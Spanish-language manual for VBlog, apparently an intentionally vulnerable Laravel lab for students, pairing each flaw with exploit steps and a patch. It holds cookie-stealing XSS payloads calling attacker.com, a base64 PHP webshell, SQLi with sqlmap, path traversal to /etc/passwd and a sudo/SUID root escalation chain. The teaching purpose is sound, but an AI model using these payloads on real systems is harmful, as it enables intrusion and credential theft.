# VBlog — Manual

## Índice

1. [Arranque](#arranque)
2. [Credenciales](#credenciales)
3. [Vulnerabilidades](#vulnerabilidades)
4. [Rutas ocultas](#rutas-ocultas)
5. [Subdominio oculto](#subdominio-oculto)
6. [Cadena de escalada completa](#cadena-de-escalada)

> Arquitectura detallada: [docs/arquitecture.md](arquitecture.md)

---

## Download/Setup

```bash
git clone https://github.com/Andonigt04/VBlog.git
```

## Arranque

```bash
sudo docker compose up --build -d
```

La app queda accesible en `http://localhost` (sin requerir configuración de dominios en `/etc/hosts`).

Los alumnos descubrirán mediante enumeración que existe el subdominio `dev.vblog.local` y deberán añadirlo manualmente a `/etc/hosts` para acceder.

---

## Credenciales

### Usuarios de la aplicación

| Rol | Usuario | Email | Contraseña |
|---|---|---|---|
| Admin | adm01 | adm01@vblog.local | adm01local |
| Editor | editor01 | editor01@vblog.local | editor01pass |
| User | (generados) | faker | faker |

> Las credenciales de editor y admin también aparecen en `/backup` (vulnerabilidad intencionada).

### Base de datos

| Campo | Valor |
|---|---|
| Host | postgresql (interno) / localhost:5432 (externo) |
| Base de datos | vblog |
| Usuario | vblog_adm |
| Contraseña | uireh34t34 |

### Acceso directo a la BD (desde el host)

```bash
psql -h localhost -p 5432 -U vblog_adm -d vblog
# contraseña: uireh34t34
```

---

## Vulnerabilidades

---

### 1. IDOR — Acceso a recursos sin autenticación

**Ubicación:** `GET /api/users/{id}`, `GET /api/posts/{id}`, `GET /api/comments`

**Por qué existe:** Las rutas no tienen middleware `auth`.

#### Explotación

**Paso 1: Enumerar usuarios sin estar logueado**
```bash
curl http://vblog.local/api/users/1
curl http://vblog.local/api/users/2
# ... iterando hasta encontrar admin (típicamente id 52)
curl http://vblog.local/api/users/52
```

**Output esperado:**
```json
{
  "id": 52,
  "name": "adm01",
  "email": "adm01@vblog.local",
  "role": "admin",
  "created_at": "..."
}
```

**Paso 2: Obtener todos los comentarios sin auth**
```bash
curl http://localhost/api/comments
```

**Impacto:**
- Enumeración completa de usuarios (emails, roles, nombres)
- Acceso a toda información de comentarios (incluyendo comentarios no publicados o borrador)
- Facilita ataques dirigidos (phishing, fuerza bruta contra cuentas admin)

#### Verificación de vulnerabilidad

**Ubicación del código:** `routes/api.php`
```php
Route::get('/users/{id}', [UserController::class, 'show']);   // ← SIN middleware auth
Route::get('/comments', [CommentController::class, 'index']); // ← SIN middleware auth
```

#### Parche Completo

**Archivo:** `routes/api.php`

**Cambio:**
```php
// vulnerable
Route::get('/users/{id}', [UserController::class, 'show']);
Route::get('/comments', [CommentController::class, 'index']);

Route::get('/users/{id}', [UserController::class, 'show'])->middleware('auth');
Route::get('/comments', [CommentController::class, 'index'])->middleware('auth');
```

#### Validación del parche

```bash
# Debe fallar con 401 Unauthorized
curl http://vblog.local/api/users/1
# Error esperado: {"status": 401, "message": "Unauthenticated"}

# Debe funcionar con sesión autenticada
curl -b cookies.txt http://vblog.local/api/users/1
# Éxito esperado: {"id": 1, "name": "...", ...}
```

---

### 2. Mass Assignment — Escalada de rol vía API

**Ubicación:** `PUT /api/update/user/{id}` en UserController

**Por qué existe:** 
- `UserController::update()` usa `$user->update($request->all())` sin filtrar campos
- El modelo `User` tiene `role` en el array `$fillable`, permitiendo modificación masiva

#### Explotación

**Paso 1: Crear cuenta usuario básico**
```bash
# Vía web: registrarse en /signup
# O usar credenciales encontradas en /backup
```

**Paso 2: Loguearse y guardar sesión**
```bash
curl -c cookies.txt -X POST http://vblog.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","passkey":"password"}'
```

**Paso 3: Verificar rol actual**
```bash
curl -b cookies.txt http://vblog.local/api/me
# Output: {"id": 53, "role": "user", ...}
```

**Paso 4: Escalar a editor**
```bash
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"editor"}'
```

**Verificación:**
```bash
curl -b cookies.txt http://vblog.local/api/me
# Output: {"id": 53, "role": "editor", ...}  ← Cambio exitoso
```

**Paso 5: Escalar a admin**
```bash
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**Impacto:**
- Elevación de privilegios inmediata
- Usuario normal → Admin sin autenticación adicional
- Acceso a panel de administración

#### Verificación de vulnerabilidad

**Ubicación:** `app/Http/Controllers/UserController.php` línea 64

```php
public function update(Request $request, $id)
{
    // ...
    $user->update($request->all());  // ← Acepta TODOS los campos
}
```

**Ubicación:** `app/Models/User.php` línea 13

```php
#[Fillable(['name', 'email', 'role', 'password'])]  // ← 'role' permitido
class User extends Model { ... }
```

#### Parche Completo

**Archivo 1:** `app/Http/Controllers/UserController.php`

```php
// ❌ ANTES (vulnerable)
public function update(Request $request, $id)
{
    try {
        $user = User::findOrFail($id);
        $user->update($request->all());  // Acepta todo
        // ...
    }
}

// ✅ DESPUÉS (protegido)
public function update(Request $request, $id)
{
    try {
        $user = User::findOrFail($id);
        
        // 1. Verificar propiedad o permisos admin
        if ($user->id !== Auth::id() && Auth::user()->role !== 'admin') {
            return response()->json(['status' => 403, 'message' => 'No autorizado'], 403);
        }
        
        // 2. Solo permitir campos seguros
        $validated = $request->validate([
            'name' => 'nullable|string|max:255',
            'email' => 'nullable|email|unique:users,email,' . $id,
            'password' => 'nullable|string|min:8'
        ]);
        
        // 3. Actualizar solo campos validados
        $user->update($validated);
        
        if ($request->wantsJson() || $request->is('api/*')) {
            return response()->json(['status' => 200, 'user' => $user]);
        }
        // ...
    }
}
```

#### Validación del parche

```bash
# Intentar escalar debería fallar
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
# Error esperado: {"status": 403, "message": "No autorizado"}

# Intentar cambiar email propio debe funcionar
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"email":"newemail@test.com"}'
# Éxito esperado: {"status": 200, "user": {...}}
```

---

### 3. Broken Access Control — Dashboard sin verificación de rol

**Ubicación:** `GET /dashboard` en `routes/web.php`

**Por qué existe:** El middleware solo verifica `auth` (sesión iniciada), no que el usuario sea admin.

#### Explotación

**Paso 1: Loguearse con usuario normal**
```bash
# Desde navegador: login en http://vblog.local
# O usar curl: POST /login, guardar sesión
```

**Paso 2: Acceder directamente al dashboard**
```bash
curl -b cookies.txt http://vblog.local/dashboard
# Respuesta: 200 OK con HTML completo del panel
```

**O desde navegador:**
```
Navegar a http://vblog.local/dashboard
→ 200 OK, panel visible con:
  - Lista de todos los usuarios
  - Lista de todos los posts
  - Lista de todos los comentarios
```

**Impacto:**
- Usuario normal ve datos de administración
- Acceso a información sensible de otros usuarios
- Facilita ataques posteriores (IDOR en datos del panel)

#### Verificación de vulnerabilidad

**Ubicación:** `routes/web.php`

```php
Route::get('/dashboard', function (Request $request) {
    // ...
})->middleware('auth');  // ← Solo verifica auth, no role
```

#### Parche Completo

**Archivo:** `routes/web.php`

```php
// ❌ ANTES (vulnerable)
Route::get('/dashboard', function (Request $request) {
    if (Auth::user()->role !== 'admin') abort(403);
    $users = User::all();
    $posts = Post::all();
    return view('dashboard', compact('users', 'posts'));
})->middleware('auth');

// ✅ DESPUÉS (protegido)
Route::get('/dashboard', function (Request $request) {
    // Verificación explícita de rol admin
    if (Auth::user()->role !== 'admin') {
        abort(403, 'Solo admins pueden acceder');
    }
    
    $users = User::all();
    $posts = Post::all();
    $comments = Comment::all();
    
    return view('dashboard', compact('users', 'posts', 'comments'));
})->middleware('auth');
```

**Alternativa usando Middleware custom:**

```php
// app/Http/Middleware/AdminOnly.php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class AdminOnly
{
    public function handle(Request $request, Closure $next)
    {
        if (Auth::user()->role !== 'admin') {
            abort(403);
        }
        return $next($request);
    }
}

// routes/web.php
Route::get('/dashboard', function () {
    // ...
})->middleware('auth', 'admin.only');
```

#### Validación del parche

```bash
# Usuario normal intenta acceder
curl -b cookies.txt http://vblog.local/dashboard
# Error esperado: 403 Forbidden

# Admin intenta acceder
curl -b admin_cookies.txt http://vblog.local/dashboard
# Éxito esperado: 200 OK con panel
```

---

### 4. Cookies Inseguras

**Ubicación:** `config/session.php`

**Por qué existe:** Flags de seguridad desactivados intencionadamente.

#### Vulnerabilidad

```php
// config/session.php línea 185
'http_only' => env('SESSION_HTTP_ONLY', false),  // ← FALSO = JavaScript puede leer

// config/session.php línea 172
'secure' => env('SESSION_SECURE_COOKIE'),        // ← NO SET = enviado por HTTP

// config/session.php línea 202
'same_site' => env('SESSION_SAME_SITE', null),   // ← NULL = sin SameSite
```

#### Explotación

**Paso 1: Inyectar XSS en comentario (vuln #5)**

```javascript
<script>
  // Roba la cookie de sesión
  fetch('http://attacker.com/?c=' + document.cookie);
</script>
```

**Paso 2: Admin visita el post con el comentario XSS**

```
→ El JavaScript se ejecuta en contexto del admin
→ Cookie de sesión se envía a attacker.com
→ Atacante puede impersonar al admin
```

#### Verificación de vulnerabilidad

```bash
# Ver las cookies de sesión tras login
curl -v -c - http://vblog.local/
# Buscar Set-Cookie:
# Resultado esperado: Sin "HttpOnly", sin "SameSite"
```

#### Parche Completo

**Archivo:** `config/session.php`

```php
// ❌ ANTES (inseguro)
'http_only' => env('SESSION_HTTP_ONLY', false),
'secure' => env('SESSION_SECURE_COOKIE'),
'same_site' => env('SESSION_SAME_SITE', null),

// ✅ DESPUÉS (seguro)
'http_only' => env('SESSION_HTTP_ONLY', true),    // Bloquea JavaScript
'secure' => env('SESSION_SECURE_COOKIE', true),   // HTTPS only
'same_site' => env('SESSION_SAME_SITE', 'lax'),   // CSRF protection
```

#### Validación del parche

```bash
# Verificar headers tras parche
curl -v http://vblog.local/ 2>&1 | grep Set-Cookie

# Debe mostrar:
# Set-Cookie: LARAVEL_SESSION=...; path=/; HttpOnly; SameSite=Lax
```

---

### 5. Headers de Seguridad Ausentes

**Ubicación:** `nginx/server.conf`

**Por qué existe:** Las líneas están comentadas intencionadamente.

#### Vulnerabilidades

```nginx
# nginx/server.conf líneas 10-11 (COMENTADAS)

# add_header X-Frame-Options "SAMEORIGIN";
# ↑ Sin esto: app embebible en iframes (clickjacking)

# add_header X-Content-Type-Options "nosniff";
# ↑ Sin esto: navegador puede interpretar MIME types incorrectamente
```

#### Explotación

```html
<!-- Clickjacking: embeber la app en iframe y ocultarla -->
<iframe src="http://vblog.local/dashboard" 
        style="opacity: 0; position: absolute; width: 100%; height: 100%;">
</iframe>
<!-- User hace click en botón "fake", realmente hace click en /dashboard -->
```

#### Verificación de vulnerabilidad

```bash
curl -I http://vblog.local/
# No debe aparecer: X-Frame-Options, X-Content-Type-Options, CSP
```

#### Parche Completo

**Archivo:** `nginx/server.conf`

```nginx
# ❌ ANTES (comentado)
# add_header X-Frame-Options "SAMEORIGIN";
# add_header X-Content-Type-Options "nosniff";

# ✅ DESPUÉS (activo)
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'";
add_header Referrer-Policy "strict-origin-when-cross-origin";
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()";
```

#### Validación del parche

```bash
# Recargar nginx
docker compose restart nginx

# Verificar headers
curl -I http://vblog.local/

# Debe mostrar:
# X-Frame-Options: SAMEORIGIN
# X-Content-Type-Options: nosniff
# Content-Security-Policy: ...
```

---

### 6. Stored XSS — Inyección en comentarios

**Ubicación:** 
- `resources/views/layouts/comment.blade.php` línea 10
- `app/Http/Controllers/CommentController.php` (sin sanitizar)

**Por qué existe:** 
- Contenido renderizado sin escapar: `{!! $comment->content !!}`
- Sin validación/sanitización antes de guardar

#### Explotación

**Paso 1: Crear comentario con payload XSS (estando logueado)**

```bash
# Obtener CSRF token desde página
# Luego enviar:

curl -b cookies.txt -X POST http://vblog.local/comments \
  -d "post_id=1&content=<script>alert(document.cookie)</script>&_token=CSRF_TOKEN"
```

**Desde formulario en navegador:**
```html
<!-- En textarea de comentario, escribir: -->
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<!-- Enviar -->
```

**Paso 2: Cualquier usuario que visite el post**
- El script se ejecuta en su navegador
- Si la cookie no tiene `HttpOnly`, se puede robar
- Especialmente peligroso si admin visita el post

#### Verificación de vulnerabilidad

**Ubicación:** `resources/views/layouts/comment.blade.php`

```blade
{{-- Vulnerable pattern --}}
<p id="comment-text-{{ $comment->id }}" class="text-zinc-200">
    {!! $comment->content !!}  {{-- ← SIN ESCAPAR --}}
</p>
```

#### Parche Completo

**Archivo 1:** `resources/views/layouts/comment.blade.php`

```blade
{{-- ❌ ANTES (vulnerable) --}}
<p id="comment-text-{{ $comment->id }}" class="text-zinc-200">
    {!! $comment->content !!}
</p>

{{-- ✅ DESPUÉS (seguro) --}}
<p id="comment-text-{{ $comment->id }}" class="text-zinc-200">
    {{ $comment->content }}  {{-- ← ESCAPADO AUTOMÁTICAMENTE --}}
</p>
```

**Archivo 2:** `app/Http/Controllers/CommentController.php`

```php
// ❌ ANTES (sin sanitizar)
public function store(Request $request)
{
    $validated = $request->validate([
        'content' => 'required|string|max:1000',
        'post_id' => 'required|exists:posts,id',
    ]);
    
    Comment::create([
        'content' => $validated['content'],  // ← Guardado tal cual
        'user_id' => Auth::id(),
        'post_id' => $validated['post_id'],
    ]);
}

// ✅ DESPUÉS (sanitizado)
public function store(Request $request)
{
    $validated = $request->validate([
        'content' => 'required|string|max:1000',
        'post_id' => 'required|exists:posts,id',
    ]);
    
    Comment::create([
        'content' => strip_tags($validated['content']),  // ← Strip HTML tags
        'user_id' => Auth::id(),
        'post_id' => $validated['post_id'],
    ]);
}
```

#### Validación del parche

```bash
# Intenta inyectar script en comentario
# → Debe guardarse como texto plano, no ejecutarse
# → Script aparece visible como "<script>alert(...)</script>"

# En consola JavaScript, verificar que document.cookie NO se ejecuta
# cuando se visita un comentario
```

---

### 7. Exposición de Información

**Ubicaciones:**
- `routes/web.php` líneas 114-152 (`/backup`, `/debug`)
- `GET /api/users` sin auth

#### Explotación

**Paso 1: Acceder a `/backup`**

```bash
curl http://vblog.local/backup
```

**Output esperado:**
```
[APP_CREDENTIALS]
editor_user=editor01
editor_pass=editor01pass
admin_user=adm01
admin_email=adm01@vblog.local
admin_pass=adm01local

[DATABASE]
host=postgresql
port=5432
database=vblog
user=vblog_adm
password=uireh34t34
```

**Paso 2: Acceder a `/debug`**

```bash
curl http://vblog.local/debug
```

**Output esperado:**
```json
{
  "app": "VBlog",
  "version": "1.0.0",
  "php": "8.2.27",
  "driver": "pgsql",
  "users_count": 52,
  "posts_count": 25,
  "server": "nginx/1.27.0"
}
```

#### Impacto

- Credenciales de admin en texto plano
- Cadena de conexión a BD
- Fingerprinting de tecnologías (facilita búsqueda de exploits)

#### Parche Completo

**Archivo:** `routes/web.php`

```php
// ❌ ANTES (públicas)
Route::get('/backup', function () { return file_get_contents(...); });
Route::get('/debug', function () { return response()->json([...]); });

// ✅ DESPUÉS (protegidas)
Route::get('/backup', function () {
    if (Auth::guest() || Auth::user()->role !== 'admin') {
        abort(403);
    }
    return file_get_contents(...);
})->middleware('auth');

Route::get('/debug', function () {
    if (Auth::guest() || Auth::user()->role !== 'admin') {
        abort(403);
    }
    return response()->json([...]);
})->middleware('auth');
```

**O eliminarlas completamente en producción:**

```php
// ✅ RECOMENDADO: eliminar rutas inseguras
// Route::get('/backup', ...);  // ← Comentar o eliminar
// Route::get('/debug', ...);   // ← Comentar o eliminar
```

#### Validación del parche

```bash
# Debe fallar sin auth
curl http://vblog.local/backup
# Error: 403 Forbidden

# Debe funcionar con admin
curl -b admin_cookies.txt http://vblog.local/backup
# Éxito: datos
```

---

### 8. Path Traversal — Lectura arbitraria de ficheros (admin)

**Ubicación:** `GET /api/admin/file?path=` en `AdminController::fileRead()`

**OWASP:** A01 — Broken Access Control / A05 — Security Misconfiguration  
**CWE:** CWE-22 (Path Traversal)

**Por qué existe:** El parámetro `path` se concatena directamente con `base_path()` sin normalización ni lista blanca.

#### Explotación

**Requisito previo:** sesión con `role=admin` (conseguida en vuln #2).

**Paso 1: Leer el `.env` de la app**
```bash
curl -b cookies.txt \
  "http://localhost/api/admin/file?path=.env"
```
Output: contenido completo de `.env` con `APP_KEY`, credenciales de BD, etc.

**Paso 2: Salir del directorio de la app**
```bash
curl -b cookies.txt \
  "http://localhost/api/admin/file?path=../../etc/passwd"
```
Output: `/etc/passwd` del contenedor → lista de usuarios del sistema.

**Paso 3: Encadenar con phase 7b** — ahora conocemos el filesystem interno y podemos buscar otros ficheros de configuración.

**Impacto:**
- Lectura de cualquier fichero legible por `www-data`
- Exposición de claves privadas, `.env`, configuraciones de servicio
- Permite construir payloads SQLi más precisos o descubrir rutas de upload

#### Verificación de vulnerabilidad

**Archivo:** [app/Http/Controllers/AdminController.php](../app/Http/Controllers/AdminController.php)
```php
public function fileRead(Request $request)
{
    $path     = $request->query('path', '');
    $fullPath = base_path($path);           // ← sin validación
    return response(file_get_contents($fullPath), 200)
        ->header('Content-Type', 'text/plain');
}
```

#### Parche Completo

```php
// ✅ DESPUÉS (con lista blanca de directorio y extensión)
public function fileRead(Request $request)
{
    $path     = $request->query('path', '');
    $fullPath = realpath(base_path($path));
    $allowed  = realpath(base_path('storage/app'));

    if (!$fullPath || !str_starts_with($fullPath, $allowed)) {
        abort(403, 'Ruta no permitida');
    }

    return response(file_get_contents($fullPath), 200)
        ->header('Content-Type', 'text/plain');
}
```

#### Validación del parche

```bash
# Debe fallar
curl -b cookies.txt "http://localhost/api/admin/file?path=../../etc/passwd"
# Error esperado: 403 Forbidden

# Debe funcionar solo dentro de storage/app
curl -b cookies.txt "http://localhost/api/admin/file?path=storage/app/info.txt"
```

---

### 9. SQL Injection — Estadísticas con filtro inyectable (admin)

**Ubicación:** `GET /api/admin/stats?filter=` en `AdminController::stats()`

**OWASP:** A03 — Injection  
**CWE:** CWE-89 (SQL Injection)

**Por qué existe:** El valor `filter` se interpola directamente en una query SQL raw sin `DB::raw()` bindings ni preparación.

#### Explotación

**Paso 1: Confirmar inyección con error**
```bash
curl -b cookies.txt \
  "http://localhost/api/admin/stats?filter='"
# Output: error 500 con traza SQL de PostgreSQL
```

**Paso 2: Time-based blind (confirmar ejecución)**
```bash
curl -b cookies.txt \
  "http://localhost/api/admin/stats?filter=%' AND (SELECT 1 FROM pg_sleep(3))=1 AND '%'='"
# Respuesta tarda ≥3 s → confirmado
```

**Paso 3: Extracción de datos con sqlmap**
```bash
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="$(grep -v '^#' /tmp/cookies.txt | awk '/laravel_session/{print $6"="$7}')" \
  --dbms=postgresql --level=3 --risk=2 --batch \
  --dump -T users
```

**Impacto:**
- Dump completo de la base de datos
- Lectura/escritura de ficheros (`COPY TO/FROM`) si el usuario de BD tiene permisos
- Posible ejecución de comandos OS en configuraciones antiguas de PostgreSQL

#### Verificación de vulnerabilidad

**Archivo:** [app/Http/Controllers/AdminController.php](../app/Http/Controllers/AdminController.php)
```php
public function stats(Request $request)
{
    $filter = $request->query('filter', '');
    $rows   = DB::select(
        "SELECT posts.id, posts.title, posts.tags
         FROM posts
         WHERE posts.tags LIKE '%{$filter}%'"  // ← interpolación directa
    );
    return response()->json(['status' => 200, 'data' => $rows]);
}
```

#### Parche Completo

```php
// ✅ DESPUÉS (binding con placeholder)
public function stats(Request $request)
{
    $filter = $request->query('filter', '');
    $rows   = DB::select(
        "SELECT posts.id, posts.title, posts.tags
         FROM posts
         WHERE posts.tags LIKE ?",
        ["%{$filter}%"]   // ← binding seguro
    );
    return response()->json(['status' => 200, 'data' => $rows]);
}
```

#### Validación del parche

```bash
# Payload de inyección debe devolver resultado vacío o normal, no un error
curl -b cookies.txt \
  "http://localhost/api/admin/stats?filter=%27%20OR%201=1--"
# Esperado: [] o resultados normales, NO traza SQL
```

---

### 10. Insecure File Upload — Webshell mediante subida sin restricción (admin)

**Ubicación:** `POST /api/admin/upload` en `AdminController::upload()`

**OWASP:** A04 — Insecure Design / A05 — Security Misconfiguration  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Por qué existe:** El servidor guarda el fichero con el nombre original sin verificar la extensión y lo coloca en `public/avatars/`, directorio servido directamente por nginx.

#### Explotación

**Paso 1: Crear la webshell**
```bash
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php
```

**Paso 2: Subir al servidor**
```bash
curl -b cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
# Output: {"url":"http://localhost/avatars/shell.php"}
```

**Paso 3: Ejecutar comandos remotamente (RCE)**
```bash
# Identidad del proceso web
curl "http://localhost/avatars/shell.php?cmd=aWQ="         # id
# Output: uid=33(www-data) gid=33(www-data)

# Listar ficheros sensibles
curl "http://localhost/avatars/shell.php?cmd=bHMgLWxhIC9ldGMv"  # ls -la /etc/
```

**Impacto:**
- Remote Code Execution como usuario `www-data`
- Pivot hacia la BD, red interna o escalada local
- Persistencia en el contenedor

#### Verificación de vulnerabilidad

**Archivo:** [app/Http/Controllers/AdminController.php](../app/Http/Controllers/AdminController.php)
```php
public function upload(Request $request)
{
    $file     = $request->file('file');
    $filename = $file->getClientOriginalName();  // ← nombre del atacante
    $file->move(public_path('avatars'), $filename);
    return response()->json(['url' => url("avatars/{$filename}")], 201);
}
```

#### Parche Completo

```php
// ✅ DESPUÉS (whitelist + nombre aleatorio)
public function upload(Request $request)
{
    $request->validate([
        'file' => 'required|file|mimes:jpeg,png,gif,webp|max:2048',
    ]);

    $file     = $request->file('file');
    $filename = Str::uuid() . '.' . $file->extension();   // nombre no predecible
    $file->move(public_path('avatars'), $filename);

    return response()->json(['url' => url("avatars/{$filename}")], 201);
}
```

**Medida adicional:** configurar nginx para que `public/avatars/` no ejecute PHP:
```nginx
location ~* ^/avatars/.*\.php$ {
    deny all;
}
```

#### Validación del parche

```bash
# Subir shell.php debe ser rechazado
curl -b cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php"
# Esperado: 422 Unprocessable Entity

# Subir imagen válida debe funcionar
curl -b cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@foto.jpg;type=image/jpeg"
# Esperado: 201 con URL
```

---

### 11. Privilege Escalation — De www-data a root

**Ubicación:** Dockerfile — sudoers + SUID bash

**OWASP:** A06 — Vulnerable and Outdated Components / A05 — Security Misconfiguration  
**CWE:** CWE-269 (Improper Privilege Management)

**Por qué existe:** El Dockerfile añade dos misconfiguraciones intencionadas:
1. `www-data` puede ejecutar `/usr/bin/find` como root sin contraseña
2. `/tmp/rootbash` es una copia de `/bin/bash` con el bit SUID activo

#### Explotación

**Requisito previo:** RCE obtenida en vuln #10 (webshell activa).

**Paso 1: Comprobar sudo**
```bash
curl "http://localhost/avatars/shell.php?cmd=c3VkbyAtbA=="
# base64: sudo -l
# Output: (root) NOPASSWD: /usr/bin/find
```

**Paso 2: GTFOBins — find como sudo para ejecutar comando como root**
```bash
# Payload: sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
CMD=$(echo 'sudo find . -exec /bin/sh -c '"'"'id > /tmp/pwned'"'"' \; -quit' | base64 -w0)
curl "http://localhost/avatars/shell.php?cmd=$CMD"

# Verificar
curl "http://localhost/avatars/shell.php?cmd=$(echo 'cat /tmp/pwned' | base64 -w0)"
# Output: uid=0(root) gid=0(root) ← ROOT
```

**Paso 3 (alternativa): SUID bash**
```bash
# Payload: /tmp/rootbash -p -c 'id'
CMD=$(echo '/tmp/rootbash -p -c id' | base64 -w0)
curl "http://localhost/avatars/shell.php?cmd=$CMD"
# Output: uid=33(www-data) euid=0(root) ← SUID efectivo
```

**Impacto:**
- Control total del contenedor como root
- Lectura de secretos del sistema (`/etc/shadow`, claves SSH)
- Posible escape del contenedor si el socket de Docker está montado

#### Verificación de vulnerabilidad

**Archivo:** [Dockerfile](../Dockerfile)
```dockerfile
RUN echo "www-data ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data \
    && chmod 0440 /etc/sudoers.d/www-data \
    && cp /bin/bash /tmp/rootbash \
    && chmod u+s /tmp/rootbash
```

#### Parche Completo

```dockerfile
# ❌ ANTES (con misconfiguraciones)
RUN echo "www-data ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data ...
RUN cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash

# ✅ DESPUÉS (eliminar ambas líneas — sin sudoers, sin SUID)
# (simplemente borrar los RUN anteriores del Dockerfile)
```

**Principio de mínimo privilegio:** el proceso web nunca debe ejecutar comandos como root. Usar usuarios sin privilegios y sin acceso a sudo.

#### Validación del parche

```bash
# Desde webshell: sudo debe fallar
sudo -l
# Error esperado: sudo: command not found (o permission denied)

# SUID bash no debe existir
ls -la /tmp/rootbash
# Error esperado: No such file or directory
```

---

## Rutas ocultas

Ninguna aparece en menús ni enlaces. Descubribles con `gobuster`, `ffuf` o `dirsearch`.

| Ruta | Código | Contenido | Parche |
|---|---|---|---|
| `/backup` | 200 OK | Credenciales de editor y admin en texto plano | Proteger con auth + admin check |
| `/debug` | 200 OK | Versión de la app, PHP, driver de BD, conteos | Proteger con auth + admin check |
| `/old` | 302 | Redirige a `/` | Sin parche necesario (decoy) |
| `/internal` | 403 | Forbidden | Sin parche necesario (decoy) |
| `/admin` | 302 | Redirige a `/dashboard` | Sin parche necesario (redirección segura) |

**Enumeración por alumnos:**

```bash
gobuster dir -u http://vblog.local \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

---

## Subdominio oculto

**URL:** `http://dev.vblog.local`

**Requisito:** Añadir en `/etc/hosts`:
```
127.0.0.1  dev.vblog.local
```

**Contenido:**

| Página | Descripción |
|---|---|
| `/` (index.html) | Panel de estado: entorno, framework, BD, endpoints rápidos |
| `/api-docs.html` | Documentación interna completa de la API con notas sobre cada vulnerabilidad y ejemplos curl |
| `/logs.html` | Logs de la app con cadena de conexión a BD, trazas del mass assignment y del XSS |

**Sin autenticación** — Panel no requiere login (vulnerabilidad intencionada).

**Enumeración de subdominios:**

```bash
gobuster vhost -u http://vblog.local \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

**Información útil en `/logs.html`:**
- Cadena de conexión a BD: `postgresql://vblog_adm:uireh34t34@postgresql:5432/vblog`
- Trazas de mass assignment: `PUT /api/update/user/53 body={"role":"admin"}`
- Pista sobre XSS en comentarios

**Nota:** En producción, este subdominio debería ser:
- Eliminado completamente, O
- Protegido por autenticación, O
- Limitado por IP de admins

---

## Cadena de escalada

```
Fase 0 — Reconocimiento (anónimo)
│
│  1. gobuster dir → /backup, /debug, /old, /internal
│  2. gobuster vhost → dev.vblog.local
│  3. curl /backup → credenciales editor01 + admin + BD
│  4. curl /debug → versión PHP, driver, conteos
│  5. ffuf /api/users/FUZZ → enumeración de IDs de usuarios (IDOR)
│  6. curl -I / → sin X-Frame-Options, sin CSP, sin headers
│
▼
Fase 1 — Usuario registrado
│
│  1. POST /api/login con editor01/editor01pass (de /backup)
│  2. GET /api/me → role: "editor"
│
▼
Fase 2 — Escalada a Admin (Mass Assignment)
│
│  1. PUT /api/update/user/{mi_id} -d '{"role":"admin"}'
│  2. GET /api/me → role: "admin"  ✓ Escalada exitosa
│  3. GET /dashboard → acceso permitido (broken access control)
│
▼
Fase 3 — Explotación XSS + acceso interno
│
│  1. POST /api/create/comment con payload <script>…</script>
│  2. XSS se ejecuta cuando cualquier usuario visita el post
│  3. Cookie robable (HttpOnly=false) → impersonación de sesiones
│  4. /etc/hosts: 127.0.0.1 dev.vblog.local
│  5. GET http://dev.vblog.local/logs.html → cadena de BD completa
│  6. psql -h localhost -p 5432 -U vblog_adm -d vblog → BD comprometida
│
▼
Fase 4 — Panel Admin: Path Traversal + SQLi
│
│  1. GET /api/admin/file?path=.env → APP_KEY + credenciales en texto plano
│  2. GET /api/admin/file?path=../../etc/passwd → usuarios del sistema
│  3. GET /api/admin/stats?filter=' → error SQL, PostgreSQL confirmado
│  4. sqlmap → dump completo de tabla users con hashes de contraseñas
│
▼
Fase 5 — RCE mediante File Upload
│
│  1. echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > shell.php
│  2. POST /api/admin/upload -F file=@shell.php → URL: /avatars/shell.php
│  3. GET /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)
│
▼
Fase 6 — Escalada a root
│
│  1. sudo -l → (root) NOPASSWD: /usr/bin/find
│  2. sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
│     → uid=0(root)  ✓ ROOT OBTENIDO
│  O:
│  3. /tmp/rootbash -p -c id → euid=0(root)  ✓ SUID bash
│
└── COMPROMETIDO COMPLETAMENTE
    - App web (RCE via webshell)
    - Base de datos (sqlmap dump)
    - Sistema operativo del contenedor (root)
    - Posible pivoting a red interna Docker
```

---

## Resumen de Parches

| # | Vuln | OWASP | Archivo | Acción |
|---|---|---|---|---|
| 1 | IDOR | A01 | routes/api.php | Agregar `middleware('auth')` |
| 2 | Mass Assignment | A04 | UserController.php | Validar input, excluir `role` de fillable o usar `only()` |
| 3 | Broken Access Control | A01 | routes/web.php | Verificar `role === 'admin'` en /dashboard |
| 4 | Cookies Inseguras | A05 | config/session.php | `HttpOnly=true`, `SameSite=lax` |
| 5 | Headers Faltantes | A05 | nginx/server.conf | Descomentar headers de seguridad |
| 6 | XSS Stored | A03 | comment.blade.php | Cambiar `{!! !!}` a `{{ }}`; `strip_tags()` en controller |
